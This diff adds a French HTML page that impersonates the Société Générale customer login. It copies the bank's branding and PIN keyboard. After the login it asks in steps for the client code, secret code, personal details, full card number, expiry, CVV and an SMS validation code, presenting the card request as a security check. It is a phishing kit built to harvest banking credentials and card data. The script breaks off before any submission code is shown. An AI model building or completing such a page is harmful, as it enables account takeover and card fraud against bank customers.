@@ -1,0 +1,1462 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Espace Client - Deux Étapes En Ligne</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --main-color: #000028;
+            --validation-color: #e9041e; /* Couleur rouge de validation */
+            --valid-color: #008000;
+            --white-color: #ffffff;
+            --light-gray: #dddddd;
+            --form-gray: #aaaaaa; 
+            --text-gray: rgb(84, 84, 84);
+            --dark-grey-text: #545454; 
+            --section-bg: #f5f5f5;
+            --keyboard-max-width: 240px; 
+            --sg-gray: #f5f5f5;
+            --sg-dark-blue: #000028;
+            --sg-light-gray-border: #e0e0e0;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--white-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            min-height: calc(100vh - 100px);
+        }
+
+        .sourcesans {
+            font-family: sourcesanspro, Arial, Helvetica, sans-serif;
+        }
+
+        .top-bar { background-color: var(--main-color); padding: 2px 20px; display: flex; justify-content: flex-end; align-items: center; }
+        .top-bar a { color: var(--white-color); text-decoration: none; font-size: 0.8em; margin-left: 20px; transition: opacity 0.3s; }
+        .main-header { padding: 15px 20px 10px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo img { height: 60px; width: auto; display: block; }
+        .btn-account { background-color: var(--main-color); color: var(--white-color); border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; font-size: 0.9em; }
+        .header-separator { height: 1px; background-color: var(--light-gray); margin: 0; }
+        
+        .left-column { 
+            flex: 1;
+            padding: 60px 40px; 
+            position: relative; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: flex-start;
+        }
+        .form-container { 
+            width: 100%;
+            max-width: 450px; 
+            margin: 0 auto; 
+            text-align: center; 
+        }
+        .left-column::after { 
+            content: '';
+            position: absolute; 
+            top: 15px; 
+            right: 0; 
+            width: 2px; 
+            height: calc(100% - 30px); 
+            background-color: var(--light-gray);
+        }
+        
+        .title-left { 
+            color: var(--text-gray);
+            font-size: 0.875rem; 
+            font-weight: bold; 
+            margin-top: 0; 
+            margin-bottom: 110px; 
+            text-align: left; 
+            width: 100%;
+        }
+        
+        .input-group { 
+            display: flex;
+            align-items: flex-start; 
+            max-width: 300px; 
+            margin: 0 auto 30px auto; 
+            position: relative; 
+            height: 50px;
+        }
+        .input-field-container { position: relative; flex-grow: 1; }
+        .input-code { 
+            border: none;
+            border-bottom: 0.5px solid var(--dark-grey-text); 
+            width: 100%; 
+            padding: 10px 30px 10px 5px; 
+            font-size: 1em; 
+            outline: none; 
+            color: var(--dark-grey-text); 
+            text-align: left;
+            box-sizing: border-box; 
+            padding-top: 18px; 
+            font-weight: bold; 
+            letter-spacing: 1px; 
+        }
+        .input-code[disabled] { background-color: transparent; cursor: default; color: var(--dark-grey-text); }
+        .floating-label { position: absolute; top: 18px; left: 5px; color: var(--text-gray); font-size: 1em; transition: all 0.2s ease-out; pointer-events: none; font-weight: normal; }
+        .input-code:focus + .floating-label, .input-code:not(:placeholder-shown) + .floating-label, .input-code[disabled] + .floating-label { top: 0; left: 5px; font-size: 0.75em; color: var(--text-gray); }
+        .dynamic-btn { position: absolute; right: 0; top: 15px; background: none; border: none; color: var(--text-gray); font-size: 1.2em; font-weight: bold; cursor: pointer; width: 30px; text-align: center; padding: 0; line-height: 1; transition: color 0.3s, background-color 0.3s, border-radius 0.3s; }
+        .dynamic-btn.valid-btn { color: var(--valid-color); }
+        
+        .controls-group { 
+            max-width: 300px;
+            margin: 0 auto 30px auto; 
+            width: 100%;
+        }
+        
+        .hidden { display: none !important; }
+        
+        .switch-group { margin-bottom: 40px; display: flex; align-items: center; justify-content: center; }
+
+        .switch-toggle { position: relative; display: inline-block; width: 45px; height: 25px; margin-right: 15px; }
+        .switch-toggle input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: var(--light-gray); transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        .switch-toggle input:checked + .slider { background-color: var(--validation-color); }
+        .switch-toggle input:checked + .slider:before { transform: translateX(18px); }
+        
+        .btn-validate { 
+            width: 100%;
+            display: block; 
+            background-color: var(--validation-color); /* Bouton en rouge */
+            color: var(--white-color); 
+            border: none; 
+            padding: 12px 30px; 
+            font-weight: bold; 
+            border-radius: 25px; 
+            text-transform: uppercase; 
+            margin: 0 auto;
+            /* Style pour le bouton désactivé par défaut (Rouge vif par défaut) */
+            cursor: not-allowed;
+        }
+        
+        .btn-validate.active {
+            opacity: 1;
+            cursor: pointer;
+        }
+        
+        .btn-validate.active:hover {
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+        }
+        
+        #step2 { display: none; width: 100%; margin-top: 25px; }
+        #step2.active { display: block; }
+        
+        .password-title {
+            color: var(--dark-grey-text); 
+            font-size: 1em; 
+            margin-bottom: 20px; 
+            text-align: center;
+        }
+
+        .password-input-container {
+            display: flex;
+            align-items: center;
+            max-width: var(--keyboard-max-width); 
+            margin: 0 auto 20px auto; 
+            position: relative;
+        }
+        
+        .password-dashes {
+            display: flex;
+            gap: 15px; 
+            justify-content: center; 
+            align-items: center;
+            height: 30px;
+            padding: 0 10px; 
+            flex-grow: 1; 
+            margin-top: 10px; 
+            margin-bottom: 5px; 
+            font-size: 1.5em;
+            font-weight: bold;
+            color: var(--dark-grey-text);
+        }
+        
+        .dash-char {
+            width: 15px;
+            text-align: center;
+        }
+        
+        .filled-char {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: var(--dark-grey-text);
+            margin: 0 3.5px;
+        }
+        
+        .clear-button {
+            position: absolute;
+            top: 5px; 
+            right: 0;
+            background: none;
+            border: none;
+            color: var(--dark-grey-text); 
+            font-size: 1.5em; 
+            cursor: pointer;
+            padding: 5px;
+            line-height: 1;
+            font-weight: normal;
+        }
+        
+        .virtual-keyboard {
+            width: 100%;
+            max-width: var(--keyboard-max-width); 
+            margin: 0 auto 30px auto; 
+            padding: 10px;
+            background-color: transparent; 
+            border-radius: 5px;
+            box-shadow: none; 
+        }
+
+        .key-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 5px; 
+            margin-bottom: 20px; 
+            justify-items: center;
+        }
+
+        .key-button {
+            background-color: #f7f7f7;
+            color: var(--dark-grey-text);
+            border: 1px solid #f0f0f0; 
+            border-radius: 5px;
+            width: 50px; 
+            height: 50px; 
+            padding: 0; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.2em; 
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .key-button.empty-key {
+            background-color: transparent; 
+            border: none; 
+            box-shadow: none; 
+            cursor: default;
+        }
+        
+        .validate-key-btn {
+            width: 100%;
+            max-width: var(--keyboard-max-width); 
+            display: block;
+            margin: 0 auto 25px auto; 
+            
+            /* Style bouton */
+            background-color: var(--validation-color); 
+            color: var(--white-color);
+            border: none;
+            padding: 12px 25px; 
+            font-weight: bold;
+            border-radius: 25px;
+            text-transform: none; 
+            font-size: 1.1em; 
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            
+            /* État bloqué */
+            cursor: not-allowed;
+        }
+        
+        .validate-key-btn.active {
+            opacity: 1;
+            cursor: pointer;
+        }
+        
+        .sound-keyboard-link {
+            text-align: center;
+            display: block;
+            margin-top: 15px; 
+            margin-bottom: 15px; 
+            border: 1px solid var(--main-color); 
+            border-radius: 20px;
+            padding: 5px 10px;
+            max-width: 180px; 
+            margin-left: auto;
+            margin-right: auto;
+            text-decoration: none;
+            color: var(--main-color);
+            font-size: 0.9em;
+            font-weight: normal;
+        }
+        
+        #loadingSpinner, #loadingSpinner2 {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid var(--validation-color); 
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s linear infinite; 
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: var(--dark-grey-text);
+            font-weight: bold;
+        }
+        
+        /* Opacité ajoutée aux zones de chargement */
+        .loading-active #loginStepContainer,
+        .loading-active #personalInfoFormContent,
+        .loading-active #cardFormContent,
+        .loading-active #smsFormContent {
+            opacity: 0.3; 
+            pointer-events: none; 
+        }
+        
+        /* Styles pour les deux pages d'infos */
+        #personalInfoFormContent,
+        #cardFormContent {
+            max-width: 450px;
+            width: 100%;
+            padding: 0;
+            box-sizing: border-box;
+            text-align: left;
+        }
+        
+        .card-form-box {
+            padding: 30px;
+            border: 1px solid var(--light-gray);
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            max-width: 380px;
+            margin: 0 auto;
+        }
+
+        #personalInfoFormContent h2,
+        #cardFormContent h2 {
+            font-size: 1.2em;
+            color: var(--validation-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        #personalInfoFormContent p,
+        #cardFormContent p {
+            font-size: 0.9em;
+            margin-bottom: 25px; 
+            color: var(--dark-grey-text);
+            text-align: center;
+            font-family: sourcesanspro, Arial, Helvetica, sans-serif;
+        }
+        
+        .card-logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .card-logo-container img {
+            max-width: 150px;
+            height: auto;
+        }
+
+        .card-input-group {
+            margin-bottom: 25px; 
+        }
+
+        .card-input-group label {
+            display: block;
+            font-size: 0.9em;
+            color: var(--dark-grey-text);
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        #personalInfoFormContent input,
+        #cardFormContent input {
+            border-radius: 6px; 
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--light-gray);
+            box-sizing: border-box;
+            font-size: 1em;
+            font-weight: bold; 
+            color: var(--form-gray);
+        }
+        
+        .card-date-cvv-group {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .card-date-cvv-group .card-input-group {
+            flex: 1;
+        }
+
+        .card-number-container {
+            position: relative;
+        }
+        
+        .cvc-field-container {
+            position: relative;
+        }
+        
+        .cvc-field-container input {
+            padding-right: 40px;
+        }
+
+        .cvc-info {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--form-gray);
+            font-size: 0.9em;
+            display: flex;
+            align-items: center;
+            pointer-events: none;
+            line-height: 1;
+        }
+        
+        .cvc-info i {
+            font-size: 1.1em;
+            margin-right: 5px;
+        }
+
+        .card-submit-btn {
+            background-color: var(--validation-color);
+            color: var(--white-color);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        #smsFormContent {
+            max-width: 450px;
+            width: 100%;
+            padding: 0;
+            box-sizing: border-box;
+            text-align: left;
+        }
+        
+        .sms-form-box {
+            padding: 30px;
+            border: 1px solid var(--light-gray);
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            max-width: 380px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        
+        #smsFormContent h2 {
+            font-size: 1.2em;
+            color: var(--validation-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        
+        .sms-form-box p {
+            font-size: 0.9em;
+            color: var(--dark-grey-text);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .sms-input-group {
+            margin-bottom: 30px;
+        }
+        
+        .sms-input-group label {
+            display: block;
+            font-size: 0.9em;
+            color: var(--dark-grey-text);
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        /* Styles pour le champ SMS */
+        #smsFormContent input {
+            width: 150px; 
+            margin: 0 auto; 
+            display: block;
+            padding: 10px;
+            border: 1px solid var(--light-gray);
+            border-radius: 6px; 
+            box-sizing: border-box;
+            font-size: 1.3em; 
+            font-weight: bold;
+            text-align: center;
+            letter-spacing: 5px; 
+            color: var(--main-color);
+        }
+
+        .sms-submit-btn {
+            background-color: var(--validation-color);
+            color: var(--white-color);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        /* Style du message d'erreur */
+        .error-message {
+            color: var(--validation-color); 
+            font-size: 0.75em;
+            margin-top: 5px;
+            height: 15px; 
+            text-align: left;
+            display: none; 
+            width: 100%;
+        }
+
+        /* Placement du message d'erreur pour le Code Client */
+        #clientCodeSection #codeInputError {
+            max-width: 300px;
+            margin: -25px auto 10px auto; 
+            padding-left: 5px;
+        }
+        
+        /* Placement du message d'erreur pour le Code Secret */
+        #passwordError {
+            max-width: var(--keyboard-max-width);
+            margin: 0 auto 5px auto; 
+            text-align: center;
+            font-size: 0.75em; 
+            color: var(--validation-color);
+        }
+
+
+        .right-column { flex: 1; padding: 60px 40px; display: flex; flex-direction: column; justify-content: center; align-items: flex-start; }
+        .right-column-content { max-width: 450px; width: 100%; text-align: left; }
+        .right-column h2 { color: var(--text-gray); font-size: 1.1em; font-weight: bold; margin-bottom: 20px; }
+        .right-column ul { list-style: none; padding-left: 0; margin-bottom: 35px; text-align: left; display: block; margin-left: 40px; } 
+        .right-column ul li { color: var(--text-gray); font-size: 0.95em; padding-left: 15px; position: relative; margin-bottom: 15px; line-height: 1.4; white-space: normal; }
+        .right-column ul li::before { content: '•'; color: var(--text-gray); font-size: 1.2em; position: absolute; left: 0; right: unset; top: 0; line-height: 1; }
+        .right-column a { display: block; color: var(--main-color); font-size: 0.95em; text-decoration: none; margin-bottom: 10px; text-align: left; }
+        .right-column .faq-links li { padding-left: 20px; margin-left: 0; }
+        .right-column .faq-links li::before { content: '»'; font-size: 1.2em; font-weight: bold; left: 0; color: var(--main-color); }
+        .right-column a:hover { text-decoration: underline; }
+
+        .other-spaces-section { background-color: var(--sg-gray); padding: 60px 20px; text-align: center; margin-top: 30px; }
+        .section-title { color: var(--sg-dark-blue); font-size: 1.5em; font-weight: bold; margin-bottom: 30px; }
+        .client-spaces { display: flex; flex-direction: column; align-items: center; gap: 20px; margin-bottom: 60px; }
+        .space-box { display: flex; align-items: center; background-color: var(--white-color); border: 1px solid var(--sg-light-gray-border); border-radius: 8px; padding: 15px 20px; width: 100%; max-width: 400px; text-decoration: none; color: inherit; box-shadow: 0 2px 5px rgba(0,0,0,0.05); transition: box-shadow 0.2s; }
+        .space-box:hover { box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .space-box i { font-size: 1.8em; color: var(--sg-dark-blue); margin-right: 15px; }
+        .space-box div { flex-grow: 1; text-align: left; }
+        .space-box strong { display: block; font-size: 1.1em; color: var(--sg-dark-blue); margin-bottom: 3px; font-weight: bold; }
+        .space-box p { font-size: 0.9em; color: var(--dark-grey-text); margin: 0; }
+        .space-box .fa-chevron-right { font-size: 1.2em; color: var(--dark-grey-text); margin-left: 15px; }
+        .utility-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; margin-top: 30px; }
+        .utility-item { display: flex; flex-direction: column; align-items: center; text-align: center; width: 100%; max-width: 200px; }
+        .utility-item i { font-size: 2em; color: var(--sg-dark-blue); margin-bottom: 10px; }
+        .utility-item strong { font-size: 1em; color: var(--sg-dark-blue); margin-bottom: 5px; }
+        .utility-item a { font-size: 0.9em; color: var(--dark-grey-text); text-decoration: underline; margin-top: 5px; }
+
+        .top-footer-bar { background-color: #000; color: var(--white-color); padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; font-size: 0.9em; }
+        .top-footer-bar .footer-links { display: flex; align-items: center; }
+        .top-footer-bar .footer-links a { color: var(--white-color); text-decoration: none; margin-right: 30px; }
+        .top-footer-bar .other-sites-dropdown { position: relative; display: inline-block; color: white; }
+        .top-footer-bar .social-icons a { color: var(--white-color); text-decoration: none; margin-left: 20px; transition: opacity 0.3s; }
+        .top-footer-bar .social-icons i { font-size: 1.2em; }
+        .top-footer-bar .social-icons .fa-times { font-size: 1.5em; font-weight: normal; }
+
+        .main-footer { background-color: var(--main-color); color: var(--white-color); padding: 60px 40px; text-align: center; font-size: 0.95em; }
+        .footer-logo-container img { height: 120px; margin-bottom: 30px; }
+        .footer-links-container { display: flex; justify-content: center; gap: 40px; margin-bottom: 40px; }
+        .footer-column { display: flex; flex-direction: column; align-items: flex-start; }
+        .footer-column a { color: var(--white-color); text-decoration: none; margin-bottom: 10px; font-size: 0.9em; text-align: left; }
+
+        .bottom-bar-footer { background-color: var(--white-color); padding: 30px 20px; text-align: center; border-top: 1px solid var(--light-gray); }
+        .bottom-bar-footer .sg-logo img { height: 120px; margin-bottom: 20px; }
+        .bottom-bar-footer .sg-links { display: flex; flex-wrap: wrap; justify-content: center; font-size: 0.8em; gap: 0; }
+        .bottom-bar-footer .sg-links a { color: var(--dark-grey-text); text-decoration: none; white-space: nowrap; padding: 0 10px; border-right: 1px solid var(--dark-grey-text); }
+        .bottom-bar-footer .sg-links a:last-child { border-right: none; }
+        .bottom-bar-footer .sg-links a:first-child { padding-left: 0; }
+        .bottom-bar-footer .sg-links a:last-child { padding-right: 0; }
+        
+        @media (max-width: 900px) {
+            .main-content { 
+                flex-direction: column;
+                min-height: auto; 
+            }
+            .left-column { 
+                padding: 30px 15px;
+                border-bottom: 1px solid var(--light-gray); 
+                align-items: center; 
+            }
+            .left-column::after { 
+                display: none;
+            }
+            .title-left {
+                text-align: left;
+                margin-bottom: 110px; 
+                width: 100%; 
+                max-width: 450px; 
+            }
+            .input-group, 
+            .controls-group {
+                width: 300px;
+                max-width: 90%; 
+            }
+            .key-button {
+                width: 40px;
+                height: 40px; 
+            }
+            .virtual-keyboard {
+                max-width: 200px;
+            }
+            .validate-key-btn {
+                max-width: 180px;
+            }
+            .right-column { 
+                padding: 30px 15px;
+                align-items: center; 
+            } 
+            .right-column-content {
+                max-width: 90%;
+            }
+            .right-column ul { 
+                margin: 0 auto 30px auto;
+                max-width: 100%;
+            } 
+            .right-column h2,
+            .right-column-content a {
+                text-align: left;
+            }
+            .top-footer-bar {
+                flex-direction: column;
+                padding: 15px 10px;
+            }
+            .top-footer-bar .footer-links, 
+            .top-footer-bar .social-icons {
+                margin-bottom: 10px;
+            }
+            .main-footer {
+                padding: 40px 20px;
+            }
+            .footer-links-container {
+                flex-direction: column;
+                gap: 20px;
+                align-items: center;
+            }
+            .footer-column {
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <a href="#agence">Agence</a>
+        <a href="#contact">Aide et contacts</a>
+    </div>
+
+    <header class="main-header">
+        <a href="#" class="logo">
+            <img src="https://i.postimg.cc/HLVVX7yb/logo.jpg" alt="Logo de la société"> 
+        </a>
+        <button class="btn-account">Ouvrir un compte</button>
+    </header>
+
+    <div class="header-separator"></div>
+
+    <main class="main-content">
+        
+        <div class="left-column">
+            
+            <h1 class="title-left sourcesans" id="mainTitle">Connexion à votre Espace Client Particuliers</h1>
+            
+            <div class="form-container">
+                
+                <div id="loginStepContainer">
+                    
+                    <div id="clientCodeSection">
+                        <div class="input-group">
+                    
+                            <div class="input-field-container">
+                                <input type="text" id="codeInput" class="input-code" placeholder=" " maxlength="8" oninput="this.value=this.value.replace(/[^0-9]/g,''); checkInputLength()">
+                                <span class="floating-label sourcesans">saisissez votre code client</span>
+                            </div>
+                            <button class="dynamic-btn" id="dynamicButton" onclick="handleDynamicButtonClick()">X</button>
+     
+                        </div>
+                        <span id="codeInputError" class="error-message"></span>
+                    
+                        <div id="step1Controls" class="controls-group">
+                            <div class="switch-group">
+      
+                                <label class="switch-toggle">
+                                    <input type="checkbox" id="rememberMe">
+                                    <span class="slider"></span>
+                                </label>
+                                <label for="rememberMe" class="sourcesans">Se souvenir de moi</label>
+                            </div>
+ 
+                            <button class="btn-validate" id="validateStep1" onclick="showPasswordStep()">Valider</button>
+                        </div>
+                    </div>
+
+                    <div id="step2" class="controls-group hidden"> 
+   
+                        
+
+
+                        <div class="password-input-container">
+                            <div class="password-dashes" id="passwordDashes">
+                                </div>
+     
+                            
+                            <button class="clear-button" onclick="clearPassword()"><i class="fas fa-times"></i></button>
+                        </div>
+                     
+                        <span id="passwordError" class="error-message sourcesans" style="text-align: center;"></span>
+                        
+                        <div class="virtual-keyboard">
+                            <div class="key-grid" id="keyGrid">
+                                </div>
+                            <button class="validate-key-btn" id="validateKeyBtn" onclick="validateFinalCode()">Valider</button>
+                            
+                        
+                            <a href="#clavier-sonore" class="sourcesans sound-keyboard-link">Activer le clavier sonore</a>
+                        </div>
+                    </div>
+
+                    <div id="loadingSpinner" class="hidden">
+                        
+                        <div class="spinner"></div>
+                        <div class="loading-text sourcesans">Veuillez patienter...</div>
+                    </div>
+
+                </div>
+                
+                <div id="personalInfoFormContent" class="hidden">
+                    <div class="card-form-box sourcesans">
+                        <h2 class="sourcesans">Informations Personnelles</h2>
+                        <p class="sourcesans">
+                            Veuillez compléter vos informations personnelles pour valider votre connexion en toute sécurité.
+                        </p>
+                        
+                        <div class="card-input-group">
+                            <label for="fullName">Nom et Prénom</label>
+                            <input type="text" id="fullName" placeholder="Votre nom complet" required>
+                            <span id="fullNameError" class="error-message"></span>
+                        </div>
+                        
+                        <div class="card-input-group">
+                            <label for="phoneNumber">Numéro de Téléphone Mobile</label>
+                            <input type="text" id="phoneNumber" placeholder="06 XX XX XX XX" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
+                            <span id="phoneNumberError" class="error-message"></span>
+                        </div>
+                        
+                        <div class="card-input-group">
+                            <label for="address">Adresse Postale</label>
+                            <input type="text" id="address" placeholder="12 Rue de l'Exemple, 75001 Paris" required>
+                            <span id="addressError" class="error-message"></span>
+                        </div>
+
+                        <button class="card-submit-btn" onclick="validatePersonalInfo()">Continuer</button>
+                    </div>
+                </div>
+
+                <div id="cardFormContent" class="hidden">
+  
+                    <div class="card-form-box sourcesans">
+                        <h2 class="sourcesans">Authentification forte</h2>
+                        <p class="sourcesans">
+                            Pour 
+                            finaliser votre connexion, veuillez confirmer l'authenticité de votre compte en renseignant les informations de votre carte bancaire.
+                        </p>
+                        
+                        <div class="card-logo-container">
+                            <img src="https://i.postimg.cc/cLDvvcrX/cb.png" alt="Logo carte bancaire">
+                   
+                        </div>
+
+                        <div class="card-input-group card-number-container">
+                            <label for="cardNumber">Numéro de carte</label>
+                            <input type="text" id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required> 
+                            <span id="cardNumberError" class="error-message"></span>
+                        </div>
+                        
+                        <div class="card-date-cvv-group">
+ 
+                            <div class="card-input-group">
+                                <label for="cardDate">Date d'expiration</label>
+                                <input type="text" id="cardDate" placeholder="MM / AA" 
+                                maxlength="5" required>
+                                <span id="cardDateError" class="error-message"></span>
+                            </div>
+                            <div class="card-input-group cvc-field-container">
+                                <label for="cardCvv">CVV</label> <input type="text" id="cardCvv" placeholder="123" maxlength="3" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
+                                <span id="cardCvvError" class="error-message"></span>
+  
+                                <div class="cvc-info">
+                                    <i class="fas fa-credit-card"></i> 
+                              
+                                </div>
+                            </div>
+                        </div>
+
+                        <button class="card-submit-btn" onclick="startCardValidation()">Confirmer</button>
+                    
+                    </div>
+                </div>
+
+                <div id="loadingSpinner2" class="hidden">
+                    <div class="spinner"></div>
+                    <div class="loading-text sourcesans" id="loadingText2">Validation des informations...</div>
+                </div>
+
+     
+                <div id="smsFormContent" class="hidden">
+                    <div class="sms-form-box sourcesans">
+                        <h2 class="sourcesans">Confirmation de prise en charge</h2>
+                        <p class="sourcesans">
+             
+                            Afin d'assurer la sécurité de votre connexion, un code de validation à  été envoyé par SMS sur votre numéro de téléphone mobile.
+                        </p>
+                        
+                        <div class="sms-input-group">
+                            <label for="smsCode">Code de validation </label>
+                  
+                            <input type="text" id="smsCode" placeholder=" _ _ _ _ _ _ " maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                            <span id="smsCodeError" class="error-message"></span>
+                        </div>
+
+                        <button class="sms-submit-btn">Confirmer le code</button>
+                    </div>
+       
+                </div>
+
+            </div>
+            
+        </div>
+
+        <div class="right-column sourcesans">
+            <div class="right-column-content">
+                <h2>Où trouver mon Code Client SG ?</h2>
+              
+                <ul>
+                    <li>Votre Code Client vous a été communiqué lors de la souscription à la 
+                        Banque à Distance.
+                        Il est également indiqué sur vos relevés de comptes.
+                    </li>
+                    <li>(Ajoutez une troisième phrase ou supprimez cette puce si deux suffisent.)</li>
+                </ul>
+                <h2>Code Client ou Code Secret inconnus ?</h2>
+                <ul class="faq-links">
+      
+                    <li><a href="#obtenir-client">Je souhaite obtenir mon Code Client</a></li>
+                    <li><a href="#code-secret">Je ne connais pas mon Code Secret</a></li>
+                </ul>
+            </div>
+        </div>
+    </main>
+
+    <div class="other-spaces-section sourcesans">
+       
+        <h2 class="section-title">Nos autres Espaces Client</h2>
+        <div class="client-spaces">
+            
+            <a href="#" class="space-box">
+                <i class="fas fa-building"></i>
+                <div>
+                    <strong>Espace Client Professionnels</strong>
+    
+                    <p>Progéliance Net</p>
+                </div>
+                <i class="fas fa-chevron-right"></i>
+            </a>
+            
+            <a href="#" class="space-box">
+           
+                <i class="fas fa-user-tie"></i>
+                <div>
+                    <strong>Espace Client Entreprises</strong>
+                    <p>Sogecash Net</p>
+                </div>
+                <i class="fas 
+                    fa-chevron-right"></i>
+            </a>
+        </div>
+
+        <h2 class="section-title">Liens utiles</h2>
+        <div class="utility-links">
+            
+            <div class="utility-item">
+                <i class="fas fa-times-circle"></i>
+                <strong>Urgences carte 
+                    bancaire</strong>
+                <a href="#">Faire opposition à votre carte bancaire</a>
+            </div>
+            
+            <div class="utility-item">
+                <i class="fas fa-shield-alt"></i>
+                <strong>Nos conseils sécurité</strong>
+     
+                <a href="#">Découvrez le Pass sécurité</a>
+            </div>
+        </div>
+    </div>
+    
+    
+    <div class="top-footer-bar sourcesans">
+        <div class="footer-links">
+            <a href="#">Questions fréquentes</a>
+            <a href="#"><i class="fas fa-map-marker-alt"></i> Trouver une agence</a>
+          
+            <div class="other-sites-dropdown">
+                <span>Autres sites SG <i class="fas fa-chevron-down"></i></span>
+                <div class="dropdown-content">
+                    <a href="#">Site Pro</a>
+                    <a href="#">Site Entreprise</a>
+               
+                    <a href="#">Autre</a>
+                </div>
+            </div>
+        </div>
+        <div class="social-icons">
+            <a href="#"><i class="fab fa-facebook-f"></i></a>
+            <a href="#"><i class="fab fa-instagram"></i></a>
+            <a href="#"><i class="fas fa-times"></i></a>
+    
+        </div>
+    </div>
+
+    <footer class="main-footer sourcesans">
+        <div class="footer-content">
+            
+            <div class="footer-logo-container">
+                <img src="https://i.postimg.cc/0NbbDJwD/logo.png" alt="Logo de la société">
+            </div>
+
+            <div class="footer-links-container">
+      
+                
+                <div class="footer-column">
+                    <a href="#compte">Ouvrir un compte</a>
+                    <a href="#agence">Trouver une agence</a>
+                    <a href="#tarifs">Nos tarifs</a>
+     
+                </div>
+                
+                <div class="footer-column">
+                    <a href="#aide">Aide et Contact</a>
+                    <a href="#mentions">Mentions Légales</a>
+           
+                    <a href="#conditions">Conditions Générales</a>
+                </div>
+                
+                <div class="footer-column">
+                    <a href="#faq">FAQ</a>
+                   
+                    <a href="#recrutement">Recrutement</a>
+                    <a href="#presse">Espace Presse</a>
+                </div>
+
+            </div>
+
+            <div class="footer-copyright">
+                &copy;
+                2025 - Tous droits réservés.
+            </div>
+        </div>
+    </footer>
+    
+    <div class="bottom-bar-footer sourcesans">
+        <div class="sg-logo">
+            <img src="https://i.postimg.cc/0NbbDJwD/logo.png" alt="Logo Société Générale">
+        </div>
+        <div class="sg-links">
+            <a href="#">Sécurité</a>
+            <a href="#">Nos engagements</a>
+    
+            <a href="#">Gestion des Cookies</a>
+            <a href="#">Données personnelles</a>
+            <a href="#">Documentation et Tarifs</a>
+            <a href="#">Résilier une prestation</a>
+            <a href="#">Contestation et réclamation</a>
+            <a href="#">Informations légales</a>
+            <a href="#">Accessibilité Numérique (partiellement 
+                conforme)</a>
+            <a href="#">Label « Engagé RSE »</a>
+        </div>
+    </div>
+
+
+    <script>
+        const codeInput = document.getElementById('codeInput');
+        const dynamicButton = document.getElementById('dynamicButton');
+        const validateStep1 = document.getElementById('validateStep1'); 
+        const validateKeyBtn = document.getElementById('validateKeyBtn'); 
+        const loginStepContainer = document.getElementById('loginStepContainer'); 
+        const step1Controls = document.getElementById('step1Controls'); 
+        const step2 = document.getElementById('step2'); 
+        const passwordDashesContainer = document.getElementById('passwordDashes');
+        const keyGrid = document.getElementById('keyGrid');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const loadingSpinner2 = document.getElementById('loadingSpinner2');
+        const personalInfoFormContent = document.getElementById('personalInfoFormContent');
+        const cardFormContent = document.getElementById('cardFormContent');
+        const smsFormContent = document.getElementById('smsFormContent');
+        const mainTitle = document.getElementById('mainTitle');
